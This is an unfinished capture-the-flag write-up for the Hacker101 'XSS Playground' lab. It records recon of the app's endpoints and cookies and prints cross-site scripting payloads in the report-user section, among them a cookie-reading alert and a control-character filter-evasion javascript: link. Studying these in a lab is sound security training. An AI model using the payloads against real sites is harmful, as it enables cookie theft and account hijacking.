# XSS Playground by zseano - hacker101 ctf - web (moderate)

As the title implies, this will likely be a page with many xss vulnerabilities.

---

---

So it looks like we need to find 5 XSS types:

- 5 Reflective Cross Site Scripting
- 3 Stored Cross Site Scripting
- 2 DOM-Based Cross Site Scripting
- 1 CSP-Bypass Cross Site Scripting
- 1 use of XSS to leak "something"

## Recon

Burpsuite result for subdirectories:

```
+] Url:                     https://92439067193144fb4615f30930969353.ctf.hacker101.com/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 315]
/.htaccess            (Status: 403) [Size: 315]
/.htpasswd            (Status: 403) [Size: 315]
/api                  (Status: 301) [Size: 386] [--> http://92439067193144fb4615f30930969353.ctf.hacker101.com/api/]                              
/inc                  (Status: 301) [Size: 386] [--> http://92439067193144fb4615f30930969353.ctf.hacker101.com/inc/]                              
/index.php            (Status: 200) [Size: 12202]
/javascript           (Status: 301) [Size: 393] [--> http://92439067193144fb4615f30930969353.ctf.hacker101.com/javascript/]                       
/server-status        (Status: 403) [Size: 315]

```

None of these enpoints are accessible so we will continue with more manual recon.

#### Cookies

Upon initial page opening, there is a popup telling us the challenge. I also notice that the "want to start again?..." button resets our cookie (default 1 upon login) to 1 and the popup shows again after that.

This functionality first uses a get request for a /logout.php endpoint that redirects us to index.php (home page) and resets our cookies.

Burpsuite analysis:

---

Ok, so there are cookies welcome, rui, cui, that may be of interest further for potential privesc or other session based attacks.

#### Feedback option

There is a green feedback button to leave zseano feedback for his blog, this is handled at the /api/feedback.php endpoint. 

When I enter "testing" for the feedback submission, I look at burp and see that the "testing" is encoded and sent to the endpoint as "dGVzdGluZwo=". This is base64. So whatever we send as feedback is first encoded as base64.

Also, after submitting our feedback, we are instantly redirected to the index.php endpoint but with a msg parameter:

```
GET /index.php?msg=Thanks,%20your%20feedback%20has%20been%20received.%20We%20appreciate%20you%20sharing%20your%20feedback. HTTP/2
```

So based on this, it looks like we have two xss attack vectors: the feedback box and the msg parameter.

#### Report User

---

The report user button also presents another attack vector for xss.

The request and response:

---

From here we learn that the RUI cookie corresponds to the report user function, so CUI may be "create user" or something with user for the U portion.

Making another report changes the rui to a new value.

We also have another parameter "act" for the action.php endpoint that uses report for the report user function, this parameter is another avenue for exploration.


#### Commenting

We can also leave comments:

---

The request and response:

---

The comment action also uses the action.php endpoint and act parameter but instead the value is "comment" not report. Also a cookie is set for CUI so the CUI is likely "comment user id" and RUI is likely "report user id".

Adding another comment replaces the old one and gives us a new cui cookie. However when I use the previous CUI value the old comment is loaded on the browser.

#### Other API endpoints

Exploring the custom.js source, there are also other actions we can perform as parameters tagged to the action.php endpoint:

- getemail
- editbio

For the editbio function, I test with burpsuite and am able to change the bio for zseano:

change bio and get cookie (PUI) for updated bio request and response:

---

---


## 5 Reflective Cross Site Scripting

## 3 Stored Cross Site Scripting

### Report user

"normal" for "your name"

```
<ul>
	<li>normal — Pending review
		<i class="fas fa-user-clock" aria-hidden="true"></i>
	</li>
</ul>
```

```
\<a+onmouseover%3d"alert(document.cookie)"\>xxs+link\</a\>
```

```
<ul>
	<li>\
		<a>xxs link\ — Pending review
			<i class="fas fa-user-clock" aria-hidden="true">
				</i>
		</a>
	</li>
</ul>
```

When I try "<a></a>" for the name of the reporter, it is entered as valid html to the page.

Let's try some <a> header payloads:

```
<a href="javascript:alert(1)">Click Me</a>
```
this payload properly adds a link button that is clickable but the link is broken the javascript is not run.

```
<a href="#" onclick="alert(document.domain)">Click Me</a>
```
this payload loads a button but nothing happens when clicked - javascript is not working for some reason

Although javascript isn't loading through this vector, by being able to add our own <a> tags, we can redirect users to malicious links of our choosing, i.e. stealing cookie information. So far we have an open redirect vulnerability at the report user function.

Trying more <a> tag based XSS payloads, I come across one that bypasses the application filtering out javascript by adding spaces and meta chars before the JS:

```
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```
---

## 2 DOM-Based Cross Site Scripting

## 1 CSP-Bypass Cross Site Scripting

## 1 use of XSS to leak "something"


## References

- Intigriti - "how to search for DOM-Based XSS!" youtube video
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
